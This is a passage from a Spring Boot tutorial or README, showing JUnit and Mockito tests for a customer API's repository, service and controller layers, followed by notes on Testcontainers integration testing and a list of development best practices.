        customer.setFirstName(""John"");
        customer.setLastName(""Wick"");
        customer.setEmail(""jwick@tester.com"");
        customer.setPhoneNumber(""0123456789"");
        customer.setDateOfBirth(LocalDate.now().minusYears(18));

    }

    @Test
    void givenValidEmail_whenFindByEmail_thenReturnCustomer() {

        // given - precondition or setup
        String email = ""jwick@tester.com"";
        customerRepository.save(customer);

        // when - action or behaviour that we are going to test
        Customer customerFromDB = customerRepository.findByEmail(email).orElse(null);

        // then - verify the output
        assertNotNull(customerFromDB);
        assertEquals(customer.getFirstName(), customerFromDB.getFirstName());
        assertEquals(customer.getLastName(), customerFromDB.getLastName());
        assertEquals(customer.getEmail(), customerFromDB.getEmail());
        assertEquals(customer.getPhoneNumber(), customerFromDB.getPhoneNumber());
        assertEquals(customer.getDateOfBirth(), customerFromDB.getDateOfBirth());
    }

    @Test
    void givenInvalidEmail_whenFindByEmail_thenReturnNothing() {

        // given - precondition or setup
        String email = ""abc@tester.com"";
        customerRepository.save(customer);

        // when - action or behaviour that we are going to test
        Customer customerFromDB = customerRepository.findByEmail(email).orElse(null);

        // then - verify the output
        assertNull(customerFromDB);
    }

    @Test
    void givenNullEmail_whenFindByEmail_thenReturnNothing() {

        // given - precondition or setup
        String email = null;
        customerRepository.save(customer);

        // when - action or behaviour that we are going to test
        Customer customerFromDB = customerRepository.findByEmail(email).orElse(null);

        // then - verify the output
        assertNull(customerFromDB);
    }

    @Test
    void givenEmptyEmail_whenFindByEmail_thenReturnNothing() {

        // given - precondition or setup
        String email = """";
        customerRepository.save(customer);

        // when - action or behaviour that we are going to test
        Customer customerFromDB = customerRepository.findByEmail(email).orElse(null);

        // then - verify the output
        assertNull(customerFromDB);
    }


}
```

</details>


<br><br>

### Testing the Service Layer

The service layer contains your business logic and interacts with the repository layer. Testing this layer typically
involves mocking the repository to isolate the service logic.

- **`@ExtendWith(MockitoExtension.class)`**: Enables Mockito annotations in your test class.
- **`@InjectMocks`**: Injects the mock objects into the service class, allowing you to test the service logic
  independently of the repository layer. This annotation creates an instance of the class under test and injects the
  mock dependencies annotated with `@Mock` into it.
- **`@Mock`**: Used to create mock instances of the repository or other dependencies.
- **`@DisplayName`**: Allows you to provide a custom name for your test methods, making them more descriptive and
  readable in test reports.

<details>
  <summary>View CustomerServiceImplTest code</summary>

```java
package com.ainigma100.customerapi.service.impl;

import com.ainigma100.customerapi.dto.CustomerDTO;
import com.ainigma100.customerapi.dto.CustomerEmailUpdateDTO;
import com.ainigma100.customerapi.entity.Customer;
import com.ainigma100.customerapi.exception.ResourceAlreadyExistException;
import com.ainigma100.customerapi.exception.ResourceNotFoundException;
import com.ainigma100.customerapi.mapper.CustomerMapper;
import com.ainigma100.customerapi.repository.CustomerRepository;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;

import java.time.LocalDate;
import java.time.LocalDateTime;
import java.util.Optional;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;
import static org.mockito.BDDMockito.given;
import static org.mockito.Mockito.*;

/*
 * @ExtendWith(MockitoExtension.class) informs Mockito that we are using
 * mockito annotations to mock the dependencies
 */
@ExtendWith(MockitoExtension.class)
class CustomerServiceImplTest {

    // @InjectMocks creates the mock object of the class and injects the mocks
    // that are marked with the annotations @Mock into it.
    @InjectMocks
    private CustomerServiceImpl customerService;

    @Mock
    private CustomerRepository customerRepository;

    @Mock
    private CustomerMapper customerMapper;

    private Customer customer;
    private CustomerDTO customerDTO;

    /**
     * This method will be executed before each and every test inside this class
     */
    @BeforeEach
    void setUp() {

        customer = new Customer();
        customer.setId(1L);
        customer.setFirstName(""John"");
        customer.setLastName(""Wick"");
        customer.setEmail(""jwick@tester.com"");
        customer.setPhoneNumber(""0123456789"");
        customer.setDateOfBirth(LocalDate.now().minusYears(18));
        customer.setCreatedDate(LocalDateTime.now());
        customer.setUpdatedDate(LocalDateTime.now());

        customerDTO = new CustomerDTO();
        customerDTO.setId(1L);
        customerDTO.setFirstName(""John"");
        customerDTO.setLastName(""Wick"");
        customerDTO.setEmail(""jwick@tester.com"");
        customerDTO.setPhoneNumber(""0123456789"");
        customerDTO.setDateOfBirth(LocalDate.now().minusYears(18));
    }


    @Test
    @DisplayName(""Test creating a new customer"")
    void givenCustomerDTO_whenCreateCustomer_thenReturnCustomerDTO() {

        // given - precondition or setup
        String email = customerDTO.getEmail();
        given(customerRepository.findByEmail(email)).willReturn(Optional.empty());
        given(customerMapper.customerDTOToCustomer(customerDTO)).willReturn(customer);
        given(customerRepository.save(customer)).willReturn(customer);
        given(customerMapper.customerToCustomerDTO(customer)).willReturn(customerDTO);

        // when - action or behaviour that we are going to test
        CustomerDTO result = customerService.createCustomer(customerDTO);

        // then - verify the output
        assertThat(result).isNotNull();
        assertThat(result.getFirstName()).isEqualTo(customerDTO.getFirstName());
        assertThat(result.getLastName()).isEqualTo(customerDTO.getLastName());
        assertThat(result.getEmail()).isEqualTo(customerDTO.getEmail());
        assertThat(result.getPhoneNumber()).isEqualTo(customerDTO.getPhoneNumber());

        verify(customerRepository, times(1)).findByEmail(email);
        verify(customerMapper, times(1)).customerDTOToCustomer(customerDTO);
        verify(customerRepository, times(1)).save(customer);
        verify(customerMapper, times(1)).customerToCustomerDTO(customer);

    }

    @Test
    @DisplayName(""Test creating a customer with existing email throws ResourceAlreadyExistException"")
    void givenExistingEmail_whenCreateCustomer_thenThrowResourceAlreadyExistException() {

        // given - precondition or setup
        String email = customerDTO.getEmail();
        given(customerRepository.findByEmail(email)).willReturn(Optional.of(customer));

        // when/then - verify that the ResourceAlreadyExistException is thrown
        assertThatThrownBy(() -> customerService.createCustomer(customerDTO))
                .isInstanceOf(ResourceAlreadyExistException.class)
                .hasMessageContaining(""Resource Customer with email : '"" + email + ""' already exist"");


        verify(customerRepository, times(1)).findByEmail(customerDTO.getEmail());
        verify(customerMapper, never()).customerDTOToCustomer(any(CustomerDTO.class));
        verify(customerRepository, never()).save(any(Customer.class));
        verify(customerMapper, never()).customerToCustomerDTO(any(Customer.class));

    }

    @Test
    @DisplayName(""Test retrieving a customer by ID"")
    void givenValidId_whenGetCustomerById_thenReturnCustomerDTO() {

        // given - precondition or setup
        Long id = 1L;
        given(customerRepository.findById(id)).willReturn(Optional.of(customer));
        given(customerMapper.customerToCustomerDTO(customer)).willReturn(customerDTO);

        // when - action or behaviour that we are going to test
        CustomerDTO result = customerService.getCustomerById(id);

        // then - verify the output
        assertThat(result).isNotNull();
        assertThat(result.getId()).isEqualTo(customerDTO.getId());
        assertThat(result.getFirstName()).isEqualTo(customerDTO.getFirstName());
        assertThat(result.getLastName()).isEqualTo(customerDTO.getLastName());
        assertThat(result.getEmail()).isEqualTo(customerDTO.getEmail());
        assertThat(result.getPhoneNumber()).isEqualTo(customerDTO.getPhoneNumber());

        verify(customerRepository, times(1)).findById(id);
        verify(customerMapper, times(1)).customerToCustomerDTO(customer);

    }


    @Test
    @DisplayName(""Test retrieving a customer by invalid ID throws ResourceNotFoundException"")
    void givenInvalidId_whenGetCustomerById_thenThrowResourceNotFoundException() {

        // given - precondition or setup
        Long id = 100L;
        given(customerRepository.findById(id)).willReturn(Optional.empty());

        // when/then - verify that the ResourceNotFoundException is thrown
        assertThatThrownBy(() -> customerService.getCustomerById(id))
                .isInstanceOf(ResourceNotFoundException.class)
                .hasMessage(""Customer with id : '"" + id + ""' not found"");


        verify(customerRepository, times(1)).findById(id);
        verify(customerMapper, never()).customerToCustomerDTO(any(Customer.class));

    }


    @Test
    @DisplayName(""Test updating a customer by ID"")
    void givenValidIdAndCustomerDTO_whenUpdateCustomer_thenReturnUpdatedCustomerDTO() {

        // given - precondition or setup
        Long id = 1L;
        given(customerRepository.findById(id)).willReturn(Optional.of(customer));
        given(customerMapper.customerDTOToCustomer(customerDTO)).willReturn(customer);
        given(customerRepository.save(customer)).willReturn(customer);
        given(customerMapper.customerToCustomerDTO(customer)).willReturn(customerDTO);

        // when - action or behaviour that we are going to test
        CustomerDTO result = customerService.updateCustomer(id, customerDTO);

        // then - verify the output
        assertThat(result).isNotNull();
        assertThat(result.getFirstName()).isEqualTo(customerDTO.getFirstName());
        assertThat(result.getLastName()).isEqualTo(customerDTO.getLastName());
        assertThat(result.getEmail()).isEqualTo(customerDTO.getEmail());
        assertThat(result.getPhoneNumber()).isEqualTo(customerDTO.getPhoneNumber());

        verify(customerRepository, times(1)).findById(id);
        verify(customerMapper, times(1)).customerDTOToCustomer(customerDTO);
        verify(customerRepository, times(1)).save(customer);
        verify(customerMapper, times(1)).customerToCustomerDTO(customer);

    }

    @Test
    @DisplayName(""Test updating a customer by invalid ID throws ResourceNotFoundException"")
    void givenInvalidIdAndCustomerDTO_whenUpdateCustomer_thenThrowResourceNotFoundException() {

        // given - precondition or setup
        Long id = 100L;
        given(customerRepository.findById(id)).willReturn(Optional.empty());

        // when/then - verify that the ResourceNotFoundException is thrown
        assertThatThrownBy(() -> customerService.updateCustomer(id, customerDTO))
                .isInstanceOf(ResourceNotFoundException.class)
                .hasMessage(""Customer with id : '"" + id + ""' not found"");


        verify(customerRepository, times(1)).findById(id);
        verify(customerMapper, never()).customerDTOToCustomer(any(CustomerDTO.class));
        verify(customerRepository, never()).save(any(Customer.class));
        verify(customerMapper, never()).customerToCustomerDTO(any(Customer.class));

    }


    @Test
    @DisplayName(""Test updating a customer's email by ID"")
    void givenValidIdAndCustomerEmailUpdateDTO_whenUpdateCustomerEmail_thenReturnCustomerDTO() {

        // given - precondition or setup
        Long id = 1L;
        CustomerEmailUpdateDTO customerEmailUpdateDTO = new CustomerEmailUpdateDTO();
        customerEmailUpdateDTO.setEmail(""loco@gmail.com"");
        customer.setEmail(customerEmailUpdateDTO.getEmail());
        given(customerRepository.findById(id)).willReturn(Optional.of(customer));
        given(customerRepository.save(customer)).willReturn(customer);
        given(customerMapper.customerToCustomerDTO(customer)).willReturn(customerDTO);

        // when - action or behaviour that we are going to test
        CustomerDTO result = customerService.updateCustomerEmail(id, customerEmailUpdateDTO);

        // then - verify the output
        assertThat(result).isNotNull();
        assertThat(result.getFirstName()).isEqualTo(customerDTO.getFirstName());
        assertThat(result.getLastName()).isEqualTo(customerDTO.getLastName());
        assertThat(result.getEmail()).isEqualTo(customerDTO.getEmail());
        assertThat(result.getPhoneNumber()).isEqualTo(customerDTO.getPhoneNumber());

        verify(customerRepository, times(1)).findById(id);
        verify(customerRepository, times(1)).save(customer);
        verify(customerMapper, times(1)).customerToCustomerDTO(customer);

    }

    @Test
    @DisplayName(""Test updating a customer's email by invalid ID throws ResourceNotFoundException"")
    void givenInvalidIdAndCustomerEmailUpdateDTO_whenUpdateCustomerEmail_thenThrowResourceNotFoundException() {

        // given - precondition or setup
        Long id = 100L;
        CustomerEmailUpdateDTO customerEmailUpdateDTO = new CustomerEmailUpdateDTO();
        customerEmailUpdateDTO.setEmail(""loco@gmail.com"");
        customer.setEmail(customerEmailUpdateDTO.getEmail());

        given(customerRepository.findById(id)).willReturn(Optional.empty());

        // when/then - verify that the ResourceNotFoundException is thrown
        assertThatThrownBy(() -> customerService.updateCustomerEmail(id, customerEmailUpdateDTO))
                .isInstanceOf(ResourceNotFoundException.class)
                .hasMessage(""Customer with id : '"" + id + ""' not found"");


        verify(customerRepository, times(1)).findById(id);
        verify(customerRepository, never()).save(any(Customer.class));
        verify(customerMapper, never()).customerToCustomerDTO(any(Customer.class));

    }


    @Test
    @DisplayName(""Test deleting a customer by ID"")
    void givenValidId_whenDeleteCustomer_thenDeleteCustomer() {

        // given - precondition or setup
        Long id = 1L;
        given(customerRepository.findById(id)).willReturn(Optional.of(customer));
        doNothing().when(customerRepository).delete(customer);

        // when - action or behaviour that we are going to test
        customerService.deleteCustomer(id);

        // then - verify the output
        verify(customerRepository, times(1)).findById(id);
        verify(customerRepository, times(1)).delete(customer);

    }

    @Test
    @DisplayName(""Test deleting a customer by invalid ID throws ResourceNotFoundException"")
    void givenInvalidId_whenDeleteCustomer_thenThrowResourceNotFoundException() {

        // given - precondition or setup
        Long id = 1L;
        given(customerRepository.findById(id)).willReturn(Optional.empty());

        // when/then - verify that the ResourceNotFoundException is thrown
        assertThatThrownBy(() -> customerService.deleteCustomer(id))
                .isInstanceOf(ResourceNotFoundException.class)
                .hasMessage(""Customer with id : '"" + id + ""' not found"");

        verify(customerRepository, times(1)).findById(id);
        verify(customerRepository, never()).delete(any(Customer.class));

    }

}
```

</details>



<br><br>

### Testing the Controller Layer

The controller layer is responsible for handling HTTP requests and returning appropriate responses. When testing this
layer, the goal is to ensure that the controller behaves correctly in response to various inputs and interactions with
its dependencies, such as services and mappers.

- **`@WebMvcTest`**: This annotation is used to load only the components required for testing the controller layer. It
  configures Spring’s testing support for MVC applications but does not load the full application context, making tests
  faster and more focused.

- **`@MockBean`**: This annotation is used to create and inject mock instances of the service layer or other
  dependencies that the controller interacts with. Mocking these dependencies ensures that the test focuses solely on
  the behavior of the controller without involving actual business logic or database interactions.

- **`@Autowired`**: This annotation is used to inject the `MockMvc` and `ObjectMapper` beans into your test class.
    - `MockMvc` is used to simulate HTTP requests and test the controller’s response without starting the server.
    - `ObjectMapper` is used for serializing and deserializing JSON objects, making it easier to work with request and
      response bodies in tests.

### Key Points:

1. **Mocking Service and Mapper**:
   - Mock the service and mapper beans to isolate the controller’s logic. By controlling the outputs of the service and
     mapper methods, you can focus your tests on the controller's behavior and ensure that it processes requests and
     responses correctly.

2. **Testing HTTP Methods**:
   - Test different HTTP methods (e.g., GET, POST, PUT, DELETE) to ensure that the controller correctly processes
     requests and returns the expected responses for each type of action.

3. **Argument Matchers**:
   - When setting up mock interactions, use `ArgumentMatchers` like `any(Class.class)` to generalize the input
     parameters, especially when you do not care about the specific value. Alternatively, use specific matchers like
     `eq()` when you want to ensure that the method is called with exact values. Choosing the right matcher depends on
     your test scenario. Understanding when to use each will make your tests more reliable.

4. **Validation of Responses**:
   - Validate the status code, headers, and response body using methods like `andExpect()`. Ensure that the response
     structure and content are what you expect. This step is crucial to verify that your API meets its contract.

5. **Use of `ResultActions`**:
   - Capture the result of the `MockMvc` request using `ResultActions`. This allows you to chain further verifications
     on the response, ensuring that all aspects of the response are as expected.

### Note:

- When writing controller tests, it’s important to decide whether to use `ArgumentMatchers` like `any()` for flexible
  input matching or `eq()` for strict matching based on the context of your test scenario. For more details on using
  argument matchers or `eq()` in Mockito, you can search online resources or refer to Mockito documentation.

<details>
  <summary>View CustomerControllerTest code</summary>

```java
package com.ainigma100.customerapi.controller;

import com.ainigma100.customerapi.dto.CustomerDTO;
import com.ainigma100.customerapi.dto.CustomerEmailUpdateDTO;
import com.ainigma100.customerapi.dto.CustomerRequestDTO;
import com.ainigma100.customerapi.enums.Status;
import com.ainigma100.customerapi.mapper.CustomerMapper;
import com.ainigma100.customerapi.service.CustomerService;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.WebMvcTest;
import org.springframework.boot.test.mock.mockito.MockBean;
import org.springframework.http.MediaType;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.ResultActions;

import java.time.LocalDate;

import static org.hamcrest.CoreMatchers.is;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.BDDMockito.given;
import static org.mockito.BDDMockito.willDoNothing;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;
import static org.springframework.test.web.servlet.result.MockMvcResultHandlers.print;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;


/*
 * @WebMvcTest annotation will load all the components required
 * to test the Controller layer. It will not load the service or repository layer components
 */
@WebMvcTest(CustomerController.class)
class CustomerControllerTest {

    @Autowired
    private ObjectMapper objectMapper;

    @Autowired
    private MockMvc mockMvc;

    @MockBean
    private CustomerService customerService;

    @MockBean
    private CustomerMapper customerMapper;

    private CustomerRequestDTO customerRequestDTO;
    private CustomerDTO customerDTO;

    @BeforeEach
    void setUp() {

        customerRequestDTO = new CustomerRequestDTO();
        customerRequestDTO.setFirstName(""John"");
        customerRequestDTO.setLastName(""Wick"");
        customerRequestDTO.setEmail(""jwick@tester.com"");
        customerRequestDTO.setPhoneNumber(""0123456789"");
        customerRequestDTO.setDateOfBirth(LocalDate.now().minusYears(18));


        customerDTO = new CustomerDTO();
        customerDTO.setId(1L);
        customerDTO.setFirstName(""John"");
        customerDTO.setLastName(""Wick"");
        customerDTO.setEmail(""jwick@tester.com"");
        customerDTO.setPhoneNumber(""0123456789"");
        customerDTO.setDateOfBirth(LocalDate.now().minusYears(18));

    }


    @Test
    void givenCustomerDTO_whenCreateCustomer_thenReturnCustomerDTO() throws Exception {

        // given - precondition or setup
        given(customerMapper.customerRequestDTOToCustomerDTO(any(CustomerRequestDTO.class)))
                .willReturn(customerDTO);

        given(customerService.createCustomer(any(CustomerDTO.class))).willReturn(customerDTO);

        // when - action or behaviour that we are going to test
        ResultActions response = mockMvc.perform(post(""/api/v1/customers"")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(customerRequestDTO)));

        // then - verify the output
        response.andDo(print())
                // verify the status code that is returned
                .andExpect(status().isCreated())
                // verify the actual returned value and the expected value
                // $ - root member of a JSON structure whether it is an object or array
                .andExpect(jsonPath(""$.status"", is(Status.SUCCESS.getValue())))
                .andExpect(jsonPath(""$.results.id"", is(1)))
                .andExpect(jsonPath(""$.results.firstName"", is(""John"")))
                .andExpect(jsonPath(""$.results.lastName"", is(""Wick"")))
                .andExpect(jsonPath(""$.results.email"", is(""jwick@tester.com"")))
                .andExpect(jsonPath(""$.results.phoneNumber"", is(""0123456789"")))
                .andExpect(jsonPath(""$.results.dateOfBirth"", is(LocalDate.now().minusYears(18).toString())));
    }


    @Test
    void givenCustomerDTO_whenGetCustomerById_thenReturnCustomerDTO() throws Exception {

        // given - precondition or setup
        given(customerService.getCustomerById(any(Long.class))).willReturn(customerDTO);

        // when - action or behaviour that we are going to test
        ResultActions response = mockMvc.perform(get(""/api/v1/customers/{id}"", 1L)
                .contentType(MediaType.APPLICATION_JSON));

        // then - verify the output
        response.andDo(print())
                // verify the status code that is returned
                .andExpect(status().isOk())
                // verify the actual returned value and the expected value
                // $ - root member of a JSON structure whether it is an object or array
                .andExpect(jsonPath(""$.status"", is(Status.SUCCESS.getValue())))
                .andExpect(jsonPath(""$.results.id"", is(1)))
                .andExpect(jsonPath(""$.results.firstName"", is(""John"")))
                .andExpect(jsonPath(""$.results.lastName"", is(""Wick"")))
                .andExpect(jsonPath(""$.results.email"", is(""jwick@tester.com"")))
                .andExpect(jsonPath(""$.results.phoneNumber"", is(""0123456789"")))
                .andExpect(jsonPath(""$.results.dateOfBirth"", is(LocalDate.now().minusYears(18).toString())));
    }


    @Test
    void givenCustomerDTO_whenUpdateCustomer_thenReturnCustomerDTO() throws Exception {

        // given - precondition or setup
        given(customerMapper.customerRequestDTOToCustomerDTO(any(CustomerRequestDTO.class)))
                .willReturn(customerDTO);

        given(customerService.updateCustomer(any(Long.class), any(CustomerDTO.class))).willReturn(customerDTO);

        // when - action or behaviour that we are going to test
        ResultActions response = mockMvc.perform(put(""/api/v1/customers/{id}"", 1L)
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(customerRequestDTO)));

        // then - verify the output
        response.andDo(print())
                // verify the status code that is returned
                .andExpect(status().isOk())
                // verify the actual returned value and the expected value
                // $ - root member of a JSON structure whether it is an object or array
                .andExpect(jsonPath(""$.status"", is(Status.SUCCESS.getValue())))
                .andExpect(jsonPath(""$.results.id"", is(1)))
                .andExpect(jsonPath(""$.results.firstName"", is(""John"")))
                .andExpect(jsonPath(""$.results.lastName"", is(""Wick"")))
                .andExpect(jsonPath(""$.results.email"", is(""jwick@tester.com"")))
                .andExpect(jsonPath(""$.results.phoneNumber"", is(""0123456789"")))
                .andExpect(jsonPath(""$.results.dateOfBirth"", is(LocalDate.now().minusYears(18).toString())));
    }


    @Test
    void givenCustomerEmailUpdateDTO_whenUpdateCustomerEmail_thenReturnCustomerDTO() throws Exception {

        // given - precondition or setup
        CustomerEmailUpdateDTO customerEmailUpdateDTO = new CustomerEmailUpdateDTO();
        customerEmailUpdateDTO.setEmail(""loco@gmail.com"");
        customerDTO.setEmail(customerEmailUpdateDTO.getEmail());

        given(customerService.updateCustomerEmail(any(Long.class), any(CustomerEmailUpdateDTO.class)))
                .willReturn(customerDTO);

        // when - action or behaviour that we are going to test
        ResultActions response = mockMvc.perform(patch(""/api/v1/customers/{id}/email"", 1L)
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(customerEmailUpdateDTO)));

        // then - verify the output
        response.andDo(print())
                // verify the status code that is returned
                .andExpect(status().isOk())
                // verify the actual returned value and the expected value
                // $ - root member of a JSON structure whether it is an object or array
                .andExpect(jsonPath(""$.status"", is(Status.SUCCESS.getValue())))
                .andExpect(jsonPath(""$.results.id"", is(1)))
                .andExpect(jsonPath(""$.results.firstName"", is(""John"")))
                .andExpect(jsonPath(""$.results.lastName"", is(""Wick"")))
                .andExpect(jsonPath(""$.results.email"", is(""loco@gmail.com"")))
                .andExpect(jsonPath(""$.results.phoneNumber"", is(""0123456789"")))
                .andExpect(jsonPath(""$.results.dateOfBirth"", is(LocalDate.now().minusYears(18).toString())));
    }


    @Test
    void givenCustomerDTO_whenDeleteCustomer_thenReturnCustomerDTO() throws Exception {

        // given - precondition or setup
        willDoNothing().given(customerService).deleteCustomer(any(Long.class));

        // when - action or behaviour that we are going to test
        ResultActions response = mockMvc.perform(delete(""/api/v1/customers/{id}"", 1L)
                .contentType(MediaType.APPLICATION_JSON));

        // then - verify the output
        response.andDo(print())
                // verify the status code that is returned
                .andExpect(status().isOk())
                // verify the actual returned value and the expected value
                // $ - root member of a JSON structure whether it is an object or array
                .andExpect(jsonPath(""$.status"", is(Status.SUCCESS.getValue())));
    }


}
```

</details>


<br><br>

### Integration Testing

Integration Testing is the phase in software testing where individual units or components of an application are combined
and tested as a group. The main goal of integration testing is to verify the interactions between different modules and
to ensure that they work together as expected. In a Spring Boot application, this typically involves testing the full
stack, including the controller, service, repository layers, and the actual database.

### Using Docker with Testcontainers

In this project, we use [Testcontainers](https://testcontainers.com/) to facilitate integration testing with a real
PostgreSQL database running in a
Docker container. This ensures that our tests run in an environment that closely mirrors production.

#### Note

To run these integration tests, Docker needs to be running on your machine. However, if Docker is not available or
running, the tests will automatically be skipped. This is managed by the following annotation in the test class:

```java
@Testcontainers(disabledWithoutDocker = true)
```

**What This Means:**

- **If Docker is running:** The integration tests will run as usual.
- **If Docker is not running:** The tests won't run, so you won't get any errors related to Docker not being available.

This setup ensures that you won't face issues with integration tests if you don’t have Docker running. It’s a way to
avoid unnecessary errors and make sure you can keep working without interruptions, especially if you're new and still
setting up your environment.

If you need to run the integration tests, just make sure Docker is installed and running on your machine.

---

## 12. Best Practices

**Disclaimer**: The practices outlined here reflect my personal approach based on what I have learned and observed from
various resources. While I believe these practices can help in building clean, maintainable, and scalable Spring Boot
applications, they are by no means the only way to approach development. I encourage you to explore other perspectives,
adapt these practices to your needs, and continuously evolve your methods as new tools and techniques emerge.

When developing Spring Boot applications, following best practices ensures your code is clean, maintainable, and
scalable. Below are some key practices to keep in mind:

### 1. Use DTOs to Abstract Entity Data

- **Purpose**: DTOs (Data Transfer Objects) are used to encapsulate data transferred between the client and server. By
  using DTOs, you prevent exposing your JPA entities directly to the client, which can mitigate security risks and
  decouple your API's data model from its internal domain model.
- **Implementation**:
    - Use tools like MapStruct or write custom mappers to convert between entities and DTOs.
    - Ensure that your controllers interact with services using DTOs, not entities, to maintain a clear separation of
      concerns.

### 2. Leverage Spring’s Dependency Injection

- **Purpose**: Dependency Injection (DI) allows for the automatic management of your application’s dependencies,
  promoting loose coupling and easier testing.
- **Best Practices**:
    - **Use Constructor Injection**: Prefer constructor injection over field injection as it makes your classes easier
      to test, clearly indicates the dependencies of your class, and supports immutability.
    - **Avoid Field Injection**: Field injection can lead to issues in unit testing and hides dependencies, making the
      code harder to understand and maintain.
    - **Use `@Autowired`**: Spring’s `@Autowired` annotation can be used to inject dependencies, but constructor
      injection is more explicit and recommended.

### 3. Handle Exceptions Globally

- **Purpose**: Centralized exception handling allows you to manage errors consistently across your application,
  improving the user experience and simplifying error management.
- **Implementation**:
    - Use `@ControllerAdvice` to create a global exception handler that handles exceptions thrown across the
      application.
    - Use `@ExceptionHandler` within `@ControllerAdvice` to specify custom handling logic for specific exception types.
    - Return structured error responses using a consistent format, which can be encapsulated in a DTO like
      `APIResponse`.

### 4. Organize Your Code

- **Purpose**: A well-organized codebase makes the project easier to navigate, understand, and maintain, especially as
  it grows in complexity.
- **Best Practices**:
    - **Separate Concerns**: Maintain a clean and organized project structure by separating concerns into different
      layers (e.g., controllers, services, repositories).
    - **Keep Methods Small**: Break down large methods into smaller, single-purpose methods to enhance readability and
      maintainability. Each method should do one thing and do it well.
    - **Avoid Repetition**: Follow the DRY (Don't Repeat Yourself) principle by abstracting common logic into reusable
      methods or classes.

### 5. Naming Conventions

- **Purpose**: Consistent naming conventions improve the readability and maintainability of your code, making it easier
  for other developers (and your future self) to understand the purpose of classes, methods, and variables.
- **Best Practices**:
    - **Packages**: Use lowercase and singular names for packages (e.g., `com.ainigma100.customerapi.controller`).
    - **Classes**: Follow PascalCase for class names (e.g., `CustomerService`), and ensure names are meaningful and
      descriptive.
    - **Methods**: Use camelCase for method names (e.g., `getCustomerById`) and keep method names descriptive to reflect
      their actions.
    - **Endpoints**: Use lowercase and hyphen-separated words for REST API endpoint paths (e.g., `/api/v1/customers`),
      and use plural nouns for collections (e.g., `/customers`).

### 6. Use Wrapper Objects for API Responses

- **Purpose**: Wrapping API responses in a standardized object (like `APIResponse`) ensures consistent structure,
  improves readability, and makes it easier to include additional metadata (e.g., status, errors) along with the actual
  data.
- **Implementation**:
    - **Standardized Structure**: Define a generic response class that encapsulates the response data, status, and any
      errors. This approach provides a uniform response format across all endpoints.
    - **Builder Pattern**: Use the Builder pattern to construct response objects, which enhances readability and
      flexibility by allowing you to add only the fields you need.
    - **Consistency**: Return response objects in all your controller methods to ensure that clients receive a
      consistent response format, which simplifies client-side parsing and error handling.

### 7. Break Down Complex Logic

- **Purpose**: Breaking down complex logic into smaller, manageable pieces makes your code easier to understand, test,
  and maintain.
- **Best Practices**:
    - **Refactor Large Methods**: If a method is doing too much, refactor it into smaller methods that each handle a
      specific part of the logic. This improves readability, makes your code more modular, and simplifies testing.
    - **Single Responsibility Principle (SRP)**: Ensure that each class and method has only one responsibility. This
      principle helps to make your code more focused, easier to maintain, and less prone to errors.
    - **Avoid Deep Nesting**: Deeply nested code blocks can be hard to follow and maintain. Consider early exits (using
      return statements) and breaking nested blocks into separate methods to enhance clarity.

### 8. Document Your Code

- **Purpose**: Well-documented code helps new developers understand the application quickly and ensures that the purpose
  of classes and methods is clear.
- **Best Practices**:
    - **Use Swagger for API Documentation**: Instead of using only the traditional Javadoc comments, leverage Swagger
      annotations to document your APIs. This approach provides interactive documentation that clients can use to
      understand and test your services.
    - **Descriptive Method and Property Names**: Ensure that your method and property names are self-explanatory, making
      the code easier to read and understand without requiring extensive comments.
    - **Generate and Share Swagger Documentation**: Utilize classes to generate Swagger documentation and export it as a
      file. This allows you to share the API documentation easily with others, ensuring they have the necessary
      information to interact with your services. You can reuse the classes I wrote in the current project.
    - **Inline Comments**: Use inline comments sparingly to explain complex logic or to provide context about why
      certain decisions were made. Comments should add value by explaining the ""why"" behind the code, not the ""what."" If
      your code is clear on what it does, it is not mandatory to add comments.

### 9. Version Control and CI/CD

- **Purpose**: Implementing a robust version control and CI/CD (Continuous Integration/Continuous Deployment) pipeline
  ensures that your codebase is always in a deployable state and that changes are tracked, reviewed, and integrated
  systematically.
- **Best Practices**:
    - **Git**: Use Git for version control, and follow a branching strategy (e.g., GitFlow) to manage feature
      development, bug fixes, and releases. Commit often with meaningful commit messages to document the history of your
      project.
    - **Code Reviews**: Incorporate code reviews into your development process to catch issues early, share knowledge
      across the team, and maintain code quality.
    - **CI/CD Pipeline**: Set up a CI/CD pipeline using tools like Jenkins, GitHub Actions, GitLab CI, or CircleCI to
      automate the building, testing, and deployment of your application. This pipeline should include:
        - **Automated Testing**: Ensure that all tests run automatically on every commit to catch issues early.
        - **Code Quality Checks**: Integrate tools like SonarQube or Checkstyle to enforce coding standards and detect
          potential issues.
        - **Deployment Automation**: Automate the deployment process to reduce manual errors and speed up delivery.

### 10. Database Migrations with Liquibase or Flyway

- **Purpose**: Database migration tools like Liquibase and Flyway help manage schema changes in a consistent and
  controlled manner. They are particularly useful in environments where the database schema evolves over time.
- **When to Use**:
    - **Use Case**: If your application requires frequent schema changes, or if you work in a team where multiple
      developers are modifying the database, using a migration tool is essential. It ensures that all changes are
      versioned, documented, and applied consistently across different environments (development, testing, production).
    - **When Not Needed**: If your application uses a fixed schema that rarely changes, or if you're using a database
      with a predefined schema where you don't manage the tables (e.g., a third-party service), you might not need a
      migration tool. In such cases, focusing on data access rather than schema management is more appropriate.
- **Best Practices**:
    - **Version Control for Migrations**: Always check your migration scripts into version control alongside your
      application code. This ensures that schema changes are versioned with the corresponding application changes.
    - **Automate Migrations**: Integrate your migration tool into your CI/CD pipeline to ensure that migrations are
      applied automatically during deployment, reducing the risk of human error.

### 11. Static Code Analysis with SonarQube

